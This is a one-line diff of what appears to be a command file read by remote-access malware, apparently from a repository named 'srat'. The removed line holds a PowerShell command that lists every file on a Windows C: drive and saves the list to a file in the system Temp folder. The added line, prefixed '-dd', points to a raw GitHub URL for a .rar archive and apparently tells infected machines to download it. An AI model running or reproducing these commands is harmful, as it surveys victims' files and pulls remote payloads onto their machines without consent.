@@ -1,1 +1,1 @@
--kGet-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Out-File -FilePath "C:\Windows\Temp\PCFUCKER.txt" -Encoding UTF8
+-ddhttps://raw.githubusercontent.com/makarow2tech/srat/main/DontEscape4_DtoS_swat.rar
